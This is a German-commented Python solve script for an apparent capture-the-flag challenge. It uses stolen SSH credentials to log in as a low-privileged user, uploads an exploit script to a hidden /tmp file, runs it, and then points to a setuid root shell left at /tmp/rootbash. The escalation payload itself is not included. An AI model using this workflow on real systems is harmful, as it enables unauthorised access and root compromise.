#!/usr/bin/env python3
"""
Phase 3 Solve-Script -- "Die Meistermaskerade" (Orchestrator)

Verbindet sich per SSH als lupin_associate (Credentials aus Phase 2),
lädt exploit.sh hoch und führt ihn aus. Nutzt bewusst nur den
Standard-OpenSSH-Client (keine zusätzliche Python-SSH-Bibliothek --
weniger Abhängigkeiten, kein paramiko/fabric nötig).

Nutzung:
    python3 solve.py <host> <lupin_associate_key> [--port 22]
"""
import argparse
import subprocess
import sys
from pathlib import Path

EXPLOIT_SCRIPT = Path(__file__).parent / "exploit.sh"


def ssh_base_args(host: str, user: str, key: str, port: int) -> list[str]:
    return [
        "ssh", "-i", key, "-p", str(port),
        "-o", "StrictHostKeyChecking=accept-new",
        "-o", "BatchMode=yes",
        f"{user}@{host}",
    ]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("key", help="Pfad zum SSH-Private-Key für lupin_associate")
    ap.add_argument("--user", default="lupin_associate")
    ap.add_argument("--port", type=int, default=22)
    args = ap.parse_args()

    remote_path = "/tmp/.vb-exploit.sh"
    script_text = EXPLOIT_SCRIPT.read_text()

    print("[*] Lade Exploit-Payload hoch ...")
    upload = subprocess.run(
        ssh_base_args(args.host, args.user, args.key, args.port)
        + [f"cat > {remote_path} && chmod +x {remote_path}"],
        input=script_text, text=True,
    )
    if upload.returncode != 0:
        print("[!] Upload fehlgeschlagen.", file=sys.stderr)
        sys.exit(1)

    print("[*] Führe Exploit aus ...")
    run = subprocess.run(
        ssh_base_args(args.host, args.user, args.key, args.port)
        + [remote_path],
    )
    if run.returncode != 0:
        print("[!] Exploit fehlgeschlagen.", file=sys.stderr)
        sys.exit(1)

    print("[+] Fertig. Root-Shell auf dem Ziel: ssh ... /tmp/rootbash -p")


if __name__ == "__main__":
    main()
